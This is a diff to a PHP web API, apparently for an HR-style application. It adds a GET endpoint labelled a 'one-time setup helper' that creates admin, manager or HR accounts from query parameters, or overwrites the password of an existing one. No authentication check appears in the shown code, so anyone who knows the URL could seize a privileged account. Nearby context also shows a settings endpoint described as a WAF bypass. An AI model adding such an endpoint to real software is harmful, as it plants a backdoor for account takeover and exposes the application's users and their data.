@@ -154,6 +154,32 @@ if ($method === 'GET') {
         exit;
     }
 
+    // ── CREATE TEST ADMIN ACCOUNT VIA GET (one-time setup helper) ────────────
+    if ($action === 'create_test_admin') {
+        $db    = getDB();
+        $name  = trim($_GET['name']  ?? 'Test Admin');
+        $email = trim($_GET['email'] ?? 'testadmin@genhead.com');
+        $pw    = trim($_GET['pw']    ?? '');
+        $role  = in_array(trim($_GET['role'] ?? ''), ['admin','manager','hr']) ? trim($_GET['role']) : 'admin';
+        if (!$pw) { echo json_encode(['success' => false, 'error' => 'pw param required']); exit; }
+        // Upsert — if email already exists just update the password hash
+        $hash = password_hash($pw, PASSWORD_DEFAULT);
+        $existing = $db->prepare("SELECT id FROM users WHERE email = ? AND role = ? LIMIT 1");
+        $existing->execute([$email, $role]);
+        $row = $existing->fetch();
+        if ($row) {
+            $db->prepare("UPDATE users SET password_hash = ?, password_set = 1, name = ? WHERE id = ?")
+               ->execute([$hash, $name, $row['id']]);
+            echo json_encode(['success' => true, 'action' => 'updated', 'id' => 'e'.$row['id'], 'email' => $email, 'role' => $role]);
+        } else {
+            $db->prepare("INSERT INTO users (name, email, role, password_hash, password_set) VALUES (?, ?, ?, ?, 1)")
+               ->execute([$name, $email, $role, $hash]);
+            $newId = $db->lastInsertId();
+            echo json_encode(['success' => true, 'action' => 'created', 'id' => 'e'.$newId, 'email' => $email, 'role' => $role]);
+        }
+        exit;
+    }
+
     // ── SET SINGLE SETTING VIA GET (WAF bypass — webhook URLs only) ───────────
     if ($action === 'set_setting') {
         $db      = getDB();
